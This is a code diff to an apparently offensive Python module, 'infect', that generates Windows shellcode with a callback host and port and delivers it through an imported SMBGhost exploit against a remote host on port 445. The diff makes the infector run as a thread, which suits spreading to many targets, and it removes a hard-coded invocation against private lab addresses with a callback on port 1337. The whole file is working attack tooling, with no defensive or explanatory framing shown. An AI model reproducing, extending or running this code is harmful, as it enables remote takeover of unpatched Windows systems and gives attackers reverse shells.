@@ -1,15 +1,19 @@
 import binascii
-import subprocess
+import threading
 import armory.SMBGhost.exploit as exploit
 
 
-class infect:
+class infect(threading.Thread):
     
     def __init__(self, rhost, rport, lhost, lport):
         self.rhost=rhost
         self.rport=rport
         self.lhost=lhost
         self.lport=lport
+        super().__init__()
+        
+    def run(self):
+        self.inject()
         
     def generate_windows_shellcode(self,lhost, lport, arch="x64"):
         print("Generating Shellcode %s with lhost %s and lport %s" % (arch, lhost, lport))
@@ -32,7 +36,3 @@ class infect:
     def inject(self):
         shell = self.generate_windows_shellcode(self.lhost,self.lport)
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
-    
-    
-s=infect("192.168.56.113",445,"192.168.56.108",1337)
-s.inject()
